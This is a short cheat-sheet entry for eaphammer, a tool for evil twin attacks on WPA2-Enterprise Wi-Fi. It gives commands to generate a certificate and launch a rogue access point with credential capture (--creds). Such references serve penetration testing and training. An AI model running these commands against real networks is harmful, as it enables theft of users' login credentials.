# eaphammer
% wifi, eaphammer, wpa-enterprise, wpa2-enterprise, eap, peap
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks.
```

## _repo
```
https://github.com/s0lst1c3/eaphammer
```

## _doc
```
https://github.com/s0lst1c3/eaphammer/wiki
```

## _install
```
```

## generate certificate
```bash
eaphammer --cert-wizard
```

## launch
```bash
eaphammer --interface <wlan_interface|wlan0> --negotiate <nego_method|balanced> --auth wpa-eap --essid <essid> --creds
```